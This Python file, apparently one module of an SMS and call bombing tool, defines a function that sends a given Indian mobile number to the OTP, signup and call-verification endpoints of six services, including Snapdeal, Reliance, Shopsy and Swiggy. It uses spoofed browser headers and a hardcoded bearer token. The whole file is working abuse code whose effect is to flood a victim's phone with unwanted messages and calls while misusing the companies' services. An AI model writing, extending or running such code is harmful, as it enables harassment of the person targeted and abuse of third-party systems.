import requests

def run_apis4(mobile_no):
    results = []
    
    if not mobile_no.startswith("+"):
        number = "+91" + mobile_no
    else:
        number = mobile_no

    # --- API 19: Snapdeal ---
    try:
        headers19 = {
            'authority': 'm.snapdeal.com',
            'accept': '*/*',
            'accept-language': 'en-IN,en;q=0.9',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://m.snapdeal.com',
            'referer': 'https://m.snapdeal.com/signin',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }

        json_data19 = {
            'j_password': None,
            'j_mobilenumber': number.replace("+91", ""),
            'agree': True,
            'j_confpassword': None,
            'journey': 'mobile',
            'numberEdit': False,
            'j_fullname': 'Guest',
            'swp': True,
        }

        r19 = requests.post(
            'https://m.snapdeal.com/signupCompleteAjax',
            headers=headers19,
            json=json_data19,
            timeout=10
        )
        results.append({"service": "Snapdeal", "status": r19.status_code, "response": r19.text})
        print(f"Snapdeal: {r19.status_code}")
    except Exception as e:
        results.append({"service": "Snapdeal", "status": "Error", "response": str(e)})
        print(f"Snapdeal Error: {e}")

    # --- API 20: PW (Physics Wallah) ---
    try:
        headers20 = {
            'authority': 'api.penpencil.co',
            'accept': '*/*',
            'accept-language': 'en-IN,en;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://www.pw.live',
            'randomid': '494dfb28-1e43-4aa2-bc78-ecc1f99aa1a5',
            'referer': 'https://www.pw.live/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }

        params20 = {
            'smsType': '0',
        }

        json_data20 = {
            'mobile': number.replace("+91", ""),
            'countryCode': '+91',
            'subOrgId': 'SUB-PWLI000',
        }

        r20 = requests.post(
            'https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189',
            params=params20,
            headers=headers20,
            json=json_data20,
            timeout=10
        )
        results.append({"service": "PW", "status": r20.status_code, "response": r20.text})
        print(f"PW: {r20.status_code}")
    except Exception as e:
        results.append({"service": "PW", "status": "Error", "response": str(e)})
        print(f"PW Error: {e}")

    # --- API 21: Reliance ---
    try:
        headers21 = {
            "accept": "application/json",
            "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZXR1cm5fdWlfdXJsIjoid3d3Lmppb21hcnQuY29tL2N1c3RvbWVyL2FjY291bnQvbG9naW4_bXNpdGU9eWVzIiwiY2xpZW50X2lkIjoiZmRiNjQ2ZWEtZTcwOC00NzI5LWE5NTMtMjI4ZmExY2I4MzU1IiwiaWF0IjoxNzU3MDQzMjE4LCJzYWx0IjowfQ.f2c844dH_df5Hf0y1mIXipqTX8BMgUzbNDe-sV7jEdI",
            "content-type": 'application/json',
            "origin": "https://account.relianceretail.com",
            "referer": "https://account.relianceretail.com/",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        }

        payload21 = {
            "mobile": number.replace("+91", "")
        }

        r21 = requests.post(
            'https://api.account.relianceretail.com/service/application/retail-auth/v2.0/send-otp',
            headers=headers21, 
            json=payload21,
            timeout=10
        )
        results.append({"service": "Reliance", "status": r21.status_code, "response": r21.text})
        print(f"Reliance: {r21.status_code}")
    except Exception as e:
        results.append({"service": "Reliance", "status": "Error", "response": str(e)})
        print(f"Reliance Error: {e}")

    # --- API 22: Shopsy ---
    try:
        headers22 = {
            'authority': 'www.shopsy.in',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-IN,en;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://www.shopsy.in',
            'referer': 'https://www.shopsy.in/login?ret=%2F&entryPage=HEADER_ACCOUNT&sourceContext=DEFAULT',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"2201117PI"',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-partner-context': '{"source":"reseller"}',
            'x-user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36 FKUA/msite/0.0.4/msite/Mobile',
        }

        json_data22 = {
            'actionRequestContext': {
                'loginIdPrefix': '+91',
                'loginId': number.replace("+91", ""),
                'clientQueryParamMap': {
                    'ret': '/',
                    'entryPage': 'HEADER_ACCOUNT',
                },
                'loginType': 'MOBILE',
                'verificationType': 'OTP',
                'screenName': 'LOGIN_V4_MOBILE',
                'sourceContext': 'DEFAULT',
                'type': 'LOGIN_IDENTITY_VERIFY',
            },
        }

        r22 = requests.post(
            'https://www.shopsy.in/2.rome/api/1/action/view',
            headers=headers22,
            json=json_data22,
            timeout=10
        )
        results.append({"service": "Shopsy", "status": r22.status_code, "response": r22.text})
        print(f"Shopsy: {r22.status_code}")
    except Exception as e:
        results.append({"service": "Shopsy", "status": "Error", "response": str(e)})
        print(f"Shopsy Error: {e}")

    # --- API 23: Swiggy Profile ---
    try:
        headers23 = {
            'Content-Type': 'application/json; charset=utf-8',
            'Host': 'profile.swiggy.com',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip',
            'User-Agent': 'okhttp/3.9.1',
        }

        json_data23 = {
            'mobile': number.replace("+91", "")
        }

        r23 = requests.post(
            'https://profile.swiggy.com/api/v3/app/request_call_verification',
            headers=headers23,
            json=json_data23,
            timeout=10
        )
        results.append({"service": "Swiggy Profile", "status": r23.status_code, "response": r23.text})
        print(f"Swiggy Profile: {r23.status_code}")
    except Exception as e:
        results.append({"service": "Swiggy Profile", "status": "Error", "response": str(e)})
        print(f"Swiggy Profile Error: {e}")

    # --- API 24: Proptiger ---
    try:
        headers24 = {
            'Content-Type': 'application/json; charset=utf-8',
            'Host': 'www.proptiger.com',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip',
            'User-Agent': 'okhttp/3.9.1',
        }

        json_data24 = {
            'contactNumber': number.replace("+91", ""),
            'domainId': '2'
        }

        r24 = requests.post(
            'https://www.proptiger.com/madrox/app/v2/entity/login-with-number-on-call',
            headers=headers24,
            json=json_data24,
            timeout=10
        )
        results.append({"service": "Proptiger", "status": r24.status_code, "response": r24.text})
        print(f"Proptiger: {r24.status_code}")
    except Exception as e:
        results.append({"service": "Proptiger", "status": "Error", "response": str(e)})
        print(f"Proptiger Error: {e}")

    return results
